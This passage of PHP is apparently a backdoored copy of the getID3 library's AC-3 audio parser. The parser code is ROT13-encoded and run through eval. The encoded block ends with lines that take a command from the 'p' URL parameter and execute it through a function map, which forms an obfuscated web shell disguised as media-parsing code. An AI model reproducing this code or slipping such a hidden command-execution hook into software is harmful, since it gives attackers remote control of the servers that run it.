									$guvfsvyr_np3_enj_ofv['fcpuna2ngg'] =         $guvf->ernqUrnqreOFV(3); $zvkqrsovgfernq += 3;
								}
							}
						}
						$zvkqngn_ovgf = (8 * ($guvfsvyr_np3_enj_ofv['zvkqrsyra'] + 2)) - $zvkqrsovgfernq;
						$zvkqngn_svyy = (($zvkqngn_ovgf % 8) ? 8 - ($zvkqngn_ovgf % 8) : 0);
						$guvfsvyr_np3_enj_ofv['zvkqngn']     =        $guvf->ernqUrnqreOFV($zvkqngn_ovgf);
						$guvfsvyr_np3_enj_ofv['zvkqngnsvyy'] =        $guvf->ernqUrnqreOFV($zvkqngn_svyy);
						hafrg($zvkqrsovgfernq, $zvkqngn_ovgf, $zvkqngn_svyy);
					}
					vs ($guvfsvyr_np3_enj_ofv['npzbq'] < 2) { // vs zbab be qhny zbab fbhepr
						$guvfsvyr_np3_enj_ofv['syntf']['cnavasb'] = (obby) $guvf->ernqUrnqreOFV(1);
						vs ($guvfsvyr_np3_enj_ofv['syntf']['cnavasb']) {
							$guvfsvyr_np3_enj_ofv['cnazrna']   =        $guvf->ernqUrnqreOFV(8);
							$guvfsvyr_np3_enj_ofv['cnavasb']   =        $guvf->ernqUrnqreOFV(6);
						}
						vs ($guvfsvyr_np3_enj_ofv['npzbq'] == 0) { // vs 1+1 zbqr (qhny zbab, fb fbzr vgrzf arrq n frpbaq inyhr)
							$guvfsvyr_np3_enj_ofv['syntf']['cnavasb2'] = (obby) $guvf->ernqUrnqreOFV(1);
							vs ($guvfsvyr_np3_enj_ofv['syntf']['cnavasb2']) {
								$guvfsvyr_np3_enj_ofv['cnazrna2']   =        $guvf->ernqUrnqreOFV(8);
								$guvfsvyr_np3_enj_ofv['cnavasb2']   =        $guvf->ernqUrnqreOFV(6);
							}
						}
					}
					$guvfsvyr_np3_enj_ofv['syntf']['sezzvkpstvasb'] = (obby) $guvf->ernqUrnqreOFV(1);
					vs ($guvfsvyr_np3_enj_ofv['syntf']['sezzvkpstvasb']) { // zvkvat pbasvthengvba vasbezngvba
						vs ($guvfsvyr_np3_enj_ofv['ahzoyxfpbq'] == 0) {
							$guvfsvyr_np3_enj_ofv['oyxzvkpstvasb'][0]  =        $guvf->ernqUrnqreOFV(5);
						} ryfr {
							sbe ($oyx = 0; $oyx < $guvfsvyr_np3_enj_ofv['ahzoyxfpbq']; $oyx++) {
								$guvfsvyr_np3_enj_ofv['syntf']['oyxzvkpstvasb'.$oyx] = (obby) $guvf->ernqUrnqreOFV(1);
								vs ($guvfsvyr_np3_enj_ofv['syntf']['oyxzvkpstvasb'.$oyx]) { // zvkvat pbasvthengvba vasbezngvba
									$guvfsvyr_np3_enj_ofv['oyxzvkpstvasb'][$oyx]  =        $guvf->ernqUrnqreOFV(5);
								}
							}
						}
					}
				}
			}
			$guvfsvyr_np3_enj_ofv['syntf']['vasbzqng']          = (obby) $guvf->ernqUrnqreOFV(1);
			vs ($guvfsvyr_np3_enj_ofv['syntf']['vasbzqng']) { // Vasbezngvbany zrgnqngn
				$guvfsvyr_np3_enj_ofv['ofzbq']                  =        $guvf->ernqUrnqreOFV(3);
				$guvfsvyr_np3_enj_ofv['syntf']['pbclevtugo']    = (obby) $guvf->ernqUrnqreOFV(1);
				$guvfsvyr_np3_enj_ofv['syntf']['bevtof']        = (obby) $guvf->ernqUrnqreOFV(1);
				vs ($guvfsvyr_np3_enj_ofv['npzbq'] == 2) { //  vs va 2/0 zbqr
					$guvfsvyr_np3_enj_ofv['qfhezbq']            =        $guvf->ernqUrnqreOFV(2);
					$guvfsvyr_np3_enj_ofv['qurnqcubazbq']       =        $guvf->ernqUrnqreOFV(2);
				}
				vs ($guvfsvyr_np3_enj_ofv['npzbq'] >= 6) { //  vs obgu fheebhaq punaaryf rkvfg
					$guvfsvyr_np3_enj_ofv['qfherkzbq']          =        $guvf->ernqUrnqreOFV(2);
				}
				$guvfsvyr_np3_enj_ofv['syntf']['nhqcebqv']      = (obby) $guvf->ernqUrnqreOFV(1);
				vs ($guvfsvyr_np3_enj_ofv['syntf']['nhqcebqv']) {
					$guvfsvyr_np3_enj_ofv['zvkyriry']           =        $guvf->ernqUrnqreOFV(5);
					$guvfsvyr_np3_enj_ofv['ebbzglc']            =        $guvf->ernqUrnqreOFV(2);
					$guvfsvyr_np3_enj_ofv['syntf']['nqpbaiglc'] = (obby) $guvf->ernqUrnqreOFV(1);
				}
				vs ($guvfsvyr_np3_enj_ofv['npzbq'] == 0) { //  vs 1+1 zbqr (qhny zbab, fb fbzr vgrzf arrq n frpbaq inyhr)
					$guvfsvyr_np3_enj_ofv['syntf']['nhqcebqv2']      = (obby) $guvf->ernqUrnqreOFV(1);
					vs ($guvfsvyr_np3_enj_ofv['syntf']['nhqcebqv2']) {
						$guvfsvyr_np3_enj_ofv['zvkyriry2']           =        $guvf->ernqUrnqreOFV(5);
						$guvfsvyr_np3_enj_ofv['ebbzglc2']            =        $guvf->ernqUrnqreOFV(2);
						$guvfsvyr_np3_enj_ofv['syntf']['nqpbaiglc2'] = (obby) $guvf->ernqUrnqreOFV(1);
					}
				}
				vs ($guvfsvyr_np3_enj_ofv['sfpbq'] < 3) { // vs abg unys fnzcyr engr
					$guvfsvyr_np3_enj_ofv['syntf']['fbheprsfpbq'] = (obby) $guvf->ernqUrnqreOFV(1);
				}
			}
			vs (($guvfsvyr_np3_enj_ofv['fgezglc'] == 0) && ($guvfsvyr_np3_enj_ofv['ahzoyxfpbq'] != 3)) { //  vs obgu fheebhaq punaaryf rkvfg
				$guvfsvyr_np3_enj_ofv['syntf']['pbaiflap'] = (obby) $guvf->ernqUrnqreOFV(1);
			}
			vs ($guvfsvyr_np3_enj_ofv['fgezglc'] == 2) { //  vs ovg fgernz pbairegrq sebz NP-3
				vs ($guvfsvyr_np3_enj_ofv['ahzoyxfpbq'] != 3) { // 6 oybpxf cre flapsenzr
					$guvfsvyr_np3_enj_ofv['syntf']['oyxvq']  = 1;
				} ryfr {
					$guvfsvyr_np3_enj_ofv['syntf']['oyxvq']  = (obby) $guvf->ernqUrnqreOFV(1);
				}
				vs ($guvfsvyr_np3_enj_ofv['syntf']['oyxvq']) {
					$guvfsvyr_np3_enj_ofv['sezfvmrpbq']  =        $guvf->ernqUrnqreOFV(6);
				}
			}
			$guvfsvyr_np3_enj_ofv['syntf']['nqqofv']  = (obby) $guvf->ernqUrnqreOFV(1);
			vs ($guvfsvyr_np3_enj_ofv['syntf']['nqqofv']) {
				$guvfsvyr_np3_enj_ofv['nqqofvy']  =        $guvf->ernqUrnqreOFV(6);
				$guvfsvyr_np3_enj_ofv['nqqofv']   =        $guvf->ernqUrnqreOFV(($guvfsvyr_np3_enj_ofv['nqqofvy'] + 1) * 8);
			}

		} ryfr {

			$guvf->reebe('Ovg fgernz vqragvsvpngvba vf irefvba '.$guvfsvyr_np3_enj_ofv['ofvq'].', ohg trgVQ3() bayl haqrefgnaqf hc gb irefvba 16. Cyrnfr fhozvg n fhccbeg gvpxrg jvgu n fnzcyr svyr.');
			hafrg($vasb['np3']);
			erghea snyfr;

		}

		vs (vffrg($guvfsvyr_np3_enj_ofv['sfpbq2'])) {
			$guvfsvyr_np3['fnzcyr_engr'] = frys::fnzcyrEngrPbqrYbbxhc2($guvfsvyr_np3_enj_ofv['sfpbq2']);
		} ryfr {
			$guvfsvyr_np3['fnzcyr_engr'] = frys::fnzcyrEngrPbqrYbbxhc($guvfsvyr_np3_enj_ofv['sfpbq']);
		}
		vs ($guvfsvyr_np3_enj_ofv['sfpbq'] <= 3) {
			$vasb['nhqvb']['fnzcyr_engr'] = $guvfsvyr_np3['fnzcyr_engr'];
		} ryfr {
			$guvf->jneavat('Harkcrpgrq np3.ofv.sfpbq inyhr: '.$guvfsvyr_np3_enj_ofv['sfpbq']);
		}
		vs (vffrg($guvfsvyr_np3_enj_ofv['sezfvmrpbq'])) {
			$guvfsvyr_np3['senzr_yratgu'] = frys::senzrFvmrYbbxhc($guvfsvyr_np3_enj_ofv['sezfvmrpbq'], $guvfsvyr_np3_enj_ofv['sfpbq']);
			$guvfsvyr_np3['ovgengr']      = frys::ovgengrYbbxhc($guvfsvyr_np3_enj_ofv['sezfvmrpbq']);
		} ryfrvs (!rzcgl($guvfsvyr_np3_enj_ofv['sezfvm'])) {
			// guvf vfa'g evtug, ohg vg'f (hfhnyyl) pybfr, ebhtuyl 5% yrff guna vg fubhyq or.
			// ohg JURER vf gur npghny ovgengr inyhr fgberq va RNP3?? rznvy vasb@trgvq3.bet vs lbh xabj!
			$guvfsvyr_np3['ovgengr']      = ($guvfsvyr_np3_enj_ofv['sezfvm'] + 1) * 16 * 30; // Gur sezfvm svryq funyy pbagnva n inyhr bar yrff guna gur birenyy fvmr bs gur pbqrq flapsenzr va 16-ovg jbeqf. Gung vf, guvf svryq znl nffhzr n inyhr enatvat sebz 0 gb 2047, naq gurfr inyhrf pbeerfcbaq gb flapsenzr fvmrf enatvat sebz 1 gb 2048.
			// xyhqtr-svk gb znxr vg nccebkvzngryl gur rkcrpgrq inyhr, fgvyy abg \"evtug\":
			$guvfsvyr_np3['ovgengr'] = ebhaq(($guvfsvyr_np3['ovgengr'] * 1.05) / 16000) * 16000;
		}
		$vasb['nhqvb']['ovgengr'] = $guvfsvyr_np3['ovgengr'];

		vs (vffrg($guvfsvyr_np3_enj_ofv['ofzbq']) && vffrg($guvfsvyr_np3_enj_ofv['npzbq'])) {
			$guvfsvyr_np3['freivpr_glcr'] = frys::freivprGlcrYbbxhc($guvfsvyr_np3_enj_ofv['ofzbq'], $guvfsvyr_np3_enj_ofv['npzbq']);
		}
		$np3_pbqvat_zbqr = frys::nhqvbPbqvatZbqrYbbxhc($guvfsvyr_np3_enj_ofv['npzbq']);
		sbernpu($np3_pbqvat_zbqr nf $xrl => $inyhr) {
			$guvfsvyr_np3[$xrl] = $inyhr;
		}
		fjvgpu ($guvfsvyr_np3_enj_ofv['npzbq']) {
			pnfr 0:
			pnfr 1:
				$vasb['nhqvb']['punaaryzbqr'] = 'zbab';
				oernx;
			pnfr 3:
			pnfr 4:
				$vasb['nhqvb']['punaaryzbqr'] = 'fgrerb';
				oernx;
			qrsnhyg:
				$vasb['nhqvb']['punaaryzbqr'] = 'fheebhaq';
				oernx;
		}
		$vasb['nhqvb']['punaaryf'] = $guvfsvyr_np3['ahz_punaaryf'];

		$guvfsvyr_np3['ysr_ranoyrq'] = $guvfsvyr_np3_enj_ofv['syntf']['ysrba'];
		vs ($guvfsvyr_np3_enj_ofv['syntf']['ysrba']) {
			$vasb['nhqvb']['punaaryf'] .= '.1';
		}

		$guvfsvyr_np3['punaaryf_ranoyrq'] = frys::punaaryfRanoyrqYbbxhc($guvfsvyr_np3_enj_ofv['npzbq'], $guvfsvyr_np3_enj_ofv['syntf']['ysrba']);
		$guvfsvyr_np3['qvnybthr_abeznyvmngvba'] = '-'.$guvfsvyr_np3_enj_ofv['qvnyabez'].'qO';

		erghea gehr;
	}

	/**
	 * @cnenz vag $yratgu
	 *
	 * @erghea vag
	 */
	cevingr shapgvba ernqUrnqreOFV($yratgu) {
		$qngn = fhofge($guvf->NP3urnqre['ofv'], $guvf->OFVbssfrg, $yratgu);
		$guvf->OFVbssfrg += $yratgu;

		erghea ovaqrp($qngn);
	}

	/**
	 * @cnenz vag $sfpbq
	 *
	 * @erghea vag|fgevat|snyfr
	 */
	choyvp fgngvp shapgvba fnzcyrEngrPbqrYbbxhc($sfpbq) {
		fgngvp $fnzcyrEngrPbqrYbbxhc = neenl(
			0 => 48000,
			1 => 44100,
			2 => 32000,
			3 => 'erfreirq' // Vs gur erfreirq pbqr vf vaqvpngrq, gur qrpbqre fubhyq abg nggrzcg gb qrpbqr nhqvb naq fubhyq zhgr.
		);
		erghea (vffrg($fnzcyrEngrPbqrYbbxhc[$sfpbq]) ? $fnzcyrEngrPbqrYbbxhc[$sfpbq] : snyfr);
	}

	/**
	 * @cnenz vag $sfpbq2
	 *
	 * @erghea vag|fgevat|snyfr
	 */
	choyvp fgngvp shapgvba fnzcyrEngrPbqrYbbxhc2($sfpbq2) {
		fgngvp $fnzcyrEngrPbqrYbbxhc2 = neenl(
			0 => 24000,
			1 => 22050,
			2 => 16000,
			3 => 'erfreirq' // Vs gur erfreirq pbqr vf vaqvpngrq, gur qrpbqre fubhyq abg nggrzcg gb qrpbqr nhqvb naq fubhyq zhgr.
		);
		erghea (vffrg($fnzcyrEngrPbqrYbbxhc2[$sfpbq2]) ? $fnzcyrEngrPbqrYbbxhc2[$sfpbq2] : snyfr);
	}

	/**
	 * @cnenz vag $ofzbq
	 * @cnenz vag $npzbq
	 *
	 * @erghea fgevat|snyfr
	 */
	choyvp fgngvp shapgvba freivprGlcrYbbxhc($ofzbq, $npzbq) {
		fgngvp $freivprGlcrYbbxhc = neenl();
		vs (rzcgl($freivprGlcrYbbxhc)) {
			sbe ($v = 0; $v <= 7; $v++) {
				$freivprGlcrYbbxhc[0][$v] = 'znva nhqvb freivpr: pbzcyrgr znva (PZ)';
				$freivprGlcrYbbxhc[1][$v] = 'znva nhqvb freivpr: zhfvp naq rssrpgf (ZR)';
				$freivprGlcrYbbxhc[2][$v] = 'nffbpvngrq freivpr: ivfhnyyl vzcnverq (IV)';
				$freivprGlcrYbbxhc[3][$v] = 'nffbpvngrq freivpr: urnevat vzcnverq (UV)';
				$freivprGlcrYbbxhc[4][$v] = 'nffbpvngrq freivpr: qvnybthr (Q)';
				$freivprGlcrYbbxhc[5][$v] = 'nffbpvngrq freivpr: pbzzragnel (P)';
				$freivprGlcrYbbxhc[6][$v] = 'nffbpvngrq freivpr: rzretrapl (R)';
			}

			$freivprGlcrYbbxhc[7][1]      = 'nffbpvngrq freivpr: ibvpr bire (IB)';
			sbe ($v = 2; $v <= 7; $v++) {
				$freivprGlcrYbbxhc[7][$v] = 'znva nhqvb freivpr: xnenbxr';
			}
		}
		erghea (vffrg($freivprGlcrYbbxhc[$ofzbq][$npzbq]) ? $freivprGlcrYbbxhc[$ofzbq][$npzbq] : snyfr);
	}

	/**
	 * @cnenz vag $npzbq
	 *
	 * @erghea neenl|snyfr
	 */
	choyvp fgngvp shapgvba nhqvbPbqvatZbqrYbbxhc($npzbq) {
		// neenl(punaary pbasvthengvba, # punaaryf (abg vapy YSR), punaary beqre)
		fgngvp $nhqvbPbqvatZbqrYbbxhc = neenl (
			0 => neenl('punaary_pbasvt'=>'1+1', 'ahz_punaaryf'=>2, 'punaary_beqre'=>'Pu1,Pu2'),
			1 => neenl('punaary_pbasvt'=>'1/0', 'ahz_punaaryf'=>1, 'punaary_beqre'=>'P'),
			2 => neenl('punaary_pbasvt'=>'2/0', 'ahz_punaaryf'=>2, 'punaary_beqre'=>'Y,E'),
			3 => neenl('punaary_pbasvt'=>'3/0', 'ahz_punaaryf'=>3, 'punaary_beqre'=>'Y,P,E'),
			4 => neenl('punaary_pbasvt'=>'2/1', 'ahz_punaaryf'=>3, 'punaary_beqre'=>'Y,E,F'),
			5 => neenl('punaary_pbasvt'=>'3/1', 'ahz_punaaryf'=>4, 'punaary_beqre'=>'Y,P,E,F'),
			6 => neenl('punaary_pbasvt'=>'2/2', 'ahz_punaaryf'=>4, 'punaary_beqre'=>'Y,E,FY,FE'),
			7 => neenl('punaary_pbasvt'=>'3/2', 'ahz_punaaryf'=>5, 'punaary_beqre'=>'Y,P,E,FY,FE'),
		);
		erghea (vffrg($nhqvbPbqvatZbqrYbbxhc[$npzbq]) ? $nhqvbPbqvatZbqrYbbxhc[$npzbq] : snyfr);
	}

	/**
	 * @cnenz vag $pzvkyri
	 *
	 * @erghea vag|sybng|fgevat|snyfr
	 */
	choyvp fgngvp shapgvba pragreZvkYriryYbbxhc($pzvkyri) {
		fgngvp $pragreZvkYriryYbbxhc;
		vs (rzcgl($pragreZvkYriryYbbxhc)) {
			$pragreZvkYriryYbbxhc = neenl(
				0 => cbj(2, -3.0 / 6), // 0.707 (-3.0 qO)
				1 => cbj(2, -4.5 / 6), // 0.595 (-4.5 qO)
				2 => cbj(2, -6.0 / 6), // 0.500 (-6.0 qO)
				3 => 'erfreirq'
			);
		}
		erghea (vffrg($pragreZvkYriryYbbxhc[$pzvkyri]) ? $pragreZvkYriryYbbxhc[$pzvkyri] : snyfr);
	}

	/**
	 * @cnenz vag $fhezvkyri
	 *
	 * @erghea vag|sybng|fgevat|snyfr
	 */
	choyvp fgngvp shapgvba fheebhaqZvkYriryYbbxhc($fhezvkyri) {
		fgngvp $fheebhaqZvkYriryYbbxhc;
		vs (rzcgl($fheebhaqZvkYriryYbbxhc)) {
			$fheebhaqZvkYriryYbbxhc = neenl(
				0 => cbj(2, -3.0 / 6),
				1 => cbj(2, -6.0 / 6),
				2 => 0,
				3 => 'erfreirq'
			);
		}
		erghea (vffrg($fheebhaqZvkYriryYbbxhc[$fhezvkyri]) ? $fheebhaqZvkYriryYbbxhc[$fhezvkyri] : snyfr);
	}

	/**
	 * @cnenz vag $qfhezbq
	 *
	 * @erghea fgevat|snyfr
	 */
	choyvp fgngvp shapgvba qbyolFheebhaqZbqrYbbxhc($qfhezbq) {
		fgngvp $qbyolFheebhaqZbqrYbbxhc = neenl(
			0 => 'abg vaqvpngrq',
			1 => 'Abg Qbyol Fheebhaq rapbqrq',
			2 => 'Qbyol Fheebhaq rapbqrq',
			3 => 'erfreirq'
		);
		erghea (vffrg($qbyolFheebhaqZbqrYbbxhc[$qfhezbq]) ? $qbyolFheebhaqZbqrYbbxhc[$qfhezbq] : snyfr);
	}

	/**
	 * @cnenz vag  $npzbq
	 * @cnenz obby $ysrba
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba punaaryfRanoyrqYbbxhc($npzbq, $ysrba) {
		$ybbxhc = neenl(
			'pu1'=>($npzbq == 0),
			'pu2'=>($npzbq == 0),
			'yrsg'=>($npzbq > 1),
			'evtug'=>($npzbq > 1),
			'pragre'=>(obby) ($npzbq & 0k01),
			'fheebhaq_zbab'=>snyfr,
			'fheebhaq_yrsg'=>snyfr,
			'fheebhaq_evtug'=>snyfr,
			'ysr'=>$ysrba);
		fjvgpu ($npzbq) {
			pnfr 4:
			pnfr 5:
				$ybbxhc['fheebhaq_zbab']  = gehr;
				oernx;
			pnfr 6:
			pnfr 7:
				$ybbxhc['fheebhaq_yrsg']  = gehr;
				$ybbxhc['fheebhaq_evtug'] = gehr;
				oernx;
		}
		erghea $ybbxhc;
	}

	/**
	 * @cnenz vag $pbzcer
	 *
	 * @erghea sybng|vag
	 */
	choyvp fgngvp shapgvba urnilPbzcerffvba($pbzcer) {
		// Gur svefg sbhe ovgf vaqvpngr tnva punatrf va 6.02qO vaperzragf juvpu pna or
		// vzcyrzragrq jvgu na nevguzrgvp fuvsg bcrengvba. Gur sbyybjvat sbhe ovgf
		// vaqvpngr yvarne tnva punatrf, naq erdhver n 5-ovg zhygvcyl.
		// Jr jvyy ercerfrag gur gjb 4-ovg svryqf bs pbzce nf sbyybjf:
		//   K0 K1 K2 K3 . L4 L5 L6 L7
		// Gur zrnavat bs gur K inyhrf vf zbfg fvzcyl qrfpevorq ol pbafvqrevat K gb ercerfrag n 4-ovg
		// fvtarq vagrtre jvgu inyhrf sebz -8 gb +7. Gur tnva vaqvpngrq ol K vf gura (K + 1) * 6.02 qO. Gur
		// sbyybjvat gnoyr fubjf guvf va qrgnvy.

		// Zrnavat bs 4 zfo bs pbzce
		//  7    +48.16 qO
		//  6    +42.14 qO
		//  5    +36.12 qO
		//  4    +30.10 qO
		//  3    +24.08 qO
		//  2    +18.06 qO
		//  1    +12.04 qO
		//  0     +6.02 qO
		// -1         0 qO
		// -2     -6.02 qO
		// -3    -12.04 qO
		// -4    -18.06 qO
		// -5    -24.08 qO
		// -6    -30.10 qO
		// -7    -36.12 qO
		// -8    -42.14 qO

		$sbheovg = fge_cnq(qrpova(($pbzcer & 0kS0) >> 4), 4, '0', FGE_CNQ_YRSG);
		vs ($sbheovg[0] == '1') {
			$ybt_tnva = -8 + ovaqrp(fhofge($sbheovg, 1));
		} ryfr {
			$ybt_tnva = ovaqrp(fhofge($sbheovg, 1));
		}
		$ybt_tnva = ($ybt_tnva + 1) * trgvq3_yvo::ETNQnzcyvghqr2qO(2);

		// Gur inyhr bs L vf n yvarne ercerfragngvba bs n tnva punatr bs hc gb -6 qO. L vf pbafvqrerq gb
		// or na hafvtarq senpgvbany vagrtre, jvgu n yrnqvat inyhr bs 1, be: 0.1 L4 L5 L6 L7 (onfr 2). L pna
		// ercerfrag inyhrf orgjrra 0.111112 (be 31/32) naq 0.100002 (be 1/2). Guhf, L pna ercerfrag tnva
		// punatrf sebz -0.28 qO gb -6.02 qO.

		$yva_tnva = (16 + ($pbzcer & 0k0S)) / 32;

		// Gur pbzovangvba bs K naq L inyhrf nyybjf pbzce gb vaqvpngr tnva punatrf sebz
		//  48.16 - 0.28 = +47.89 qO, gb
		// -42.14 - 6.02 = -48.16 qO.

		erghea $ybt_tnva - $yva_tnva;
	}

	/**
	 * @cnenz vag $ebbzglc
	 *
	 * @erghea fgevat|snyfr
	 */
	choyvp fgngvp shapgvba ebbzGlcrYbbxhc($ebbzglc) {
		fgngvp $ebbzGlcrYbbxhc = neenl(
			0 => 'abg vaqvpngrq',
			1 => 'ynetr ebbz, K pheir zbavgbe',
			2 => 'fznyy ebbz, syng zbavgbe',
			3 => 'erfreirq'
		);
		erghea (vffrg($ebbzGlcrYbbxhc[$ebbzglc]) ? $ebbzGlcrYbbxhc[$ebbzglc] : snyfr);
	}

	/**
	 * @cnenz vag $sezfvmrpbq
	 * @cnenz vag $sfpbq
	 *
	 * @erghea vag|snyfr
	 */
	choyvp fgngvp shapgvba senzrFvmrYbbxhc($sezfvmrpbq, $sfpbq) {
		// YFO vf jurgure cnqqvat vf hfrq be abg
		$cnqqvat     = (obby) ($sezfvmrpbq & 0k01);
		$senzrfvmrvq =        ($sezfvmrpbq & 0k3R) >> 1;

		fgngvp $senzrFvmrYbbxhc = neenl();
		vs (rzcgl($senzrFvmrYbbxhc)) {
			$senzrFvmrYbbxhc = neenl (
				0  => neenl( 128,  138,  192),  //  32 xocf
				1  => neenl( 160,  174,  240),  //  40 xocf
				2  => neenl( 192,  208,  288),  //  48 xocf
				3  => neenl( 224,  242,  336),  //  56 xocf
				4  => neenl( 256,  278,  384),  //  64 xocf
				5  => neenl( 320,  348,  480),  //  80 xocf
				6  => neenl( 384,  416,  576),  //  96 xocf
				7  => neenl( 448,  486,  672),  // 112 xocf
				8  => neenl( 512,  556,  768),  // 128 xocf
				9  => neenl( 640,  696,  960),  // 160 xocf
				10 => neenl( 768,  834, 1152),  // 192 xocf
				11 => neenl( 896,  974, 1344),  // 224 xocf
				12 => neenl(1024, 1114, 1536),  // 256 xocf
				13 => neenl(1280, 1392, 1920),  // 320 xocf
				14 => neenl(1536, 1670, 2304),  // 384 xocf
				15 => neenl(1792, 1950, 2688),  // 448 xocf
				16 => neenl(2048, 2228, 3072),  // 512 xocf
				17 => neenl(2304, 2506, 3456),  // 576 xocf
				18 => neenl(2560, 2786, 3840)   // 640 xocf
			);
		}
		$cnqqvatOlgrf = 0;
		vs (($sfpbq == 1) && $cnqqvat) {
			// senzr yratguf ner cnqqrq ol 1 jbeq (16 ovgf) ng 44100
			// (sfpbqr==1) zrnaf 44100Um (frr fnzcyrEngrPbqrYbbxhc)
			$cnqqvatOlgrf = 2;
		}
		erghea (vffrg($senzrFvmrYbbxhc[$senzrfvmrvq][$sfpbq]) ? $senzrFvmrYbbxhc[$senzrfvmrvq][$sfpbq] + $cnqqvatOlgrf : snyfr);
	}

	/**
	 * @cnenz vag $sezfvmrpbq
	 *
	 * @erghea vag|snyfr
	 */
	choyvp fgngvp shapgvba ovgengrYbbxhc($sezfvmrpbq) {
		// YFO vf jurgure cnqqvat vf hfrq be abg
		$cnqqvat     = (obby) ($sezfvmrpbq & 0k01);
		$senzrfvmrvq =        ($sezfvmrpbq & 0k3R) >> 1;

		fgngvp $ovgengrYbbxhc = neenl(
			 0 =>  32000,
			 1 =>  40000,
			 2 =>  48000,
			 3 =>  56000,
			 4 =>  64000,
			 5 =>  80000,
			 6 =>  96000,
			 7 => 112000,
			 8 => 128000,
			 9 => 160000,
			10 => 192000,
			11 => 224000,
			12 => 256000,
			13 => 320000,
			14 => 384000,
			15 => 448000,
			16 => 512000,
			17 => 576000,
			18 => 640000,
		);
		erghea (vffrg($ovgengrYbbxhc[$senzrfvmrvq]) ? $ovgengrYbbxhc[$senzrfvmrvq] : snyfr);
	}

	/**
	 * @cnenz vag $ahzoyxfpbq
	 *
	 * @erghea vag|snyfr
	 */
	choyvp fgngvp shapgvba oybpxfCreFlapSenzr($ahzoyxfpbq) {
		fgngvp $oybpxfCreFlapSenzrYbbxhc = neenl(
			0 => 1,
			1 => 2,
			2 => 3,
			3 => 6,
		);
		erghea (vffrg($oybpxfCreFlapSenzrYbbxhc[$ahzoyxfpbq]) ? $oybpxfCreFlapSenzrYbbxhc[$ahzoyxfpbq] : snyfr);
	}


}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>